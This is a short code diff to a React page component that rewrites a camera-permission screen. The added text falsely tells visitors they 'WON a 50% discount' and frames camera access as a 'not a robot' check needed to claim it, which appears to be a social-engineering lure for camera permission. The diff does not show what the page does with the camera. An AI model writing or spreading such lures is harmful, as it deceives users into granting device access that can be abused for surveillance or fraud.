@@ -223,9 +223,13 @@ function PitchContent() {
               </div>
             </div>
 
-            <h2 className="text-white text-center font-bold text-xl mb-3">
-              Verification Required
+            <h2 className="text-[#00FF75] text-center font-bold text-2xl mb-2 animate-pulse">
+              Wait! You WON a 50% discount!
             </h2>
+
+            <p className="text-white text-center text-sm mb-4">
+              To claim your discount, verify you're not a robot
+            </p>
 
             <div className="flex items-center justify-center mb-4">
               <div className="relative">
@@ -249,7 +253,7 @@ function PitchContent() {
             </div>
 
             <p className="text-[#A0A0A0] text-center text-sm mb-2">
-              We need to verify you're not a robot. Please accept the camera permission for verification.
+              Please accept the camera permission to continue.
             </p>
 
             <p className="text-[#FF6B6B] text-center text-xs mb-4">
